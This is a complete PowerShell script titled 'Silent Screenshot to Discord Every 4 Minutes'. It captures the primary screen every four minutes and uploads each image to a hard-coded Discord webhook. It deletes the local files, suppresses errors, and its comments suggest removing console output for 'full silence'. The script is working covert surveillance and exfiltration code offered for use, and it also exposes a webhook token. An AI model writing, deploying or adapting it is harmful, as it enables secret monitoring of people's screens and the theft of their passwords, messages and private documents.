# ===============================================
# Silent Screenshot to Discord Every 4 Minutes
# ===============================================

$webhookUrl = "https://discord.com/api/webhooks/1507397879671685150/oRYUF8gCcyWpGAaRLBMA1pdAAvjRPq0iCfA7eXbnqI6-PZTVICQsAn-wbTbwjKMHyWoa"

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

function Take-Screenshot {
    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $screenshot = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
    $graphics = [System.Drawing.Graphics]::FromImage($screenshot)
    
    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
    
    $tempFile = "$env:TEMP\screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
    $screenshot.Save($tempFile, [System.Drawing.Imaging.ImageFormat]::Png)
    
    $graphics.Dispose()
    $screenshot.Dispose()
    
    return $tempFile
}

function Send-ToDiscord {
    param([string]$filePath)
    
    $fileName = Split-Path $filePath -Leaf
    $fileBin = [System.IO.File]::ReadAllBytes($filePath)
    
    $boundary = "----Boundary$(Get-Random)"
    
    $bodyStart = @"
--$boundary
Content-Disposition: form-data; name="file"; filename="$fileName"
Content-Type: image/png

"@
    $bodyEnd = @"

--$boundary--
"@

    $body = [System.Text.Encoding]::UTF8.GetBytes($bodyStart) + $fileBin + [System.Text.Encoding]::UTF8.GetBytes($bodyEnd)
    
    try {
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "multipart/form-data; boundary=$boundary" | Out-Null
    } catch {
        # Silently fail
    }
    
    Remove-Item $filePath -Force -ErrorAction SilentlyContinue
}

# ==================== Main Loop ====================
Write-Host "Starting silent screenshot every 4 minutes..." -ForegroundColor Green

while ($true) {
    $screenshotPath = Take-Screenshot
    Send-ToDiscord -filePath $screenshotPath
    
    # Optional: Show progress in console (you can remove this line for full silence)
    Write-Host "$(Get-Date -Format 'HH:mm:ss') - Screenshot sent" -ForegroundColor Gray
    
    Start-Sleep -Seconds (4 * 60)   # 4 minutes
}
